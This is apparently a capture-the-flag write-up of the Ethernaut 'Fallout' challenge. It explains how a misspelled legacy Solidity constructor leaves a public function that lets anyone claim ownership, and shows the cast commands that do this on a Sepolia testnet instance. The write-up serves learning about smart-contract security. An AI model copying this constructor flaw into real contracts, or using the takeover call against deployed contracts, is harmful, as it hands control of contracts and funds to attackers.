# Ethernaut Challenge 02 — Fallout

This challenge demonstrates a historical Solidity vulnerability related to incorrectly defined constructors.

---

## 🎯 Goal

The challenge is solved when you **claim ownership of the contract**.

---

## 🧠 Thought process

Looking at the contract, the following function appears to be the constructor:

```solidity
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

However, the contract name is:

```solidity
contract Fallout
```

Notice the difference:

```
Fallout
Fal1out
```

The letter **`l` has been replaced with `1`**, so this function is **not recognized as the constructor**.

In older versions of Solidity (before the `constructor` keyword was introduced), constructors had to have the **exact same name as the contract**.

Because of this typo:

- the constructor is **never executed during deployment**
- the function `Fal1out()` becomes a **public function**
- the `owner` variable is **never initialized**

In Solidity, uninitialized storage variables default to:

```
0x0000000000000000000000000000000000000000
```

So after deployment:

```
owner = address(0)
```

This means **anyone can call `Fal1out()` and become the owner**.

---

## 🧪 Step 1 — Inspect the contract onchain

Instance address:

```
0xE53a2EBA4218FAE1f4DB2c3abE62A7daB4E28dA7
```

First, load the RPC URL:

```bash
source .env
```

Check the current owner:

```bash
cast call 0xE53a2EBA4218FAE1f4DB2c3abE62A7daB4E28dA7 \
    "owner()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x0000000000000000000000000000000000000000000000000000000000000000
```

This confirms that the owner is the **zero address**, meaning the constructor never ran.

---

## 🔓 Step 2 — Call the misnamed constructor

Since `Fal1out()` is actually a public function, we can call it directly.

```bash
cast send 0xE53a2EBA4218FAE1f4DB2c3abE62A7daB4E28dA7 \
    "Fal1out()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```
0x9a84056200fffb6d99d7a496a2ea43f6d005dfc90403a6978f2c1d7918cc4b1d
```

Inside the function the contract executes:

```solidity
owner = msg.sender;
```

So the caller becomes the new owner.

---

## 🚀 Step 3 — Verify ownership

Check the owner again:

```bash
cast call 0xE53a2EBA4218FAE1f4DB2c3abE62A7daB4E28dA7 \
    "owner()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x000000000000000000000000ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0
```

This is my wallet address, confirming that ownership has been successfully claimed.

---

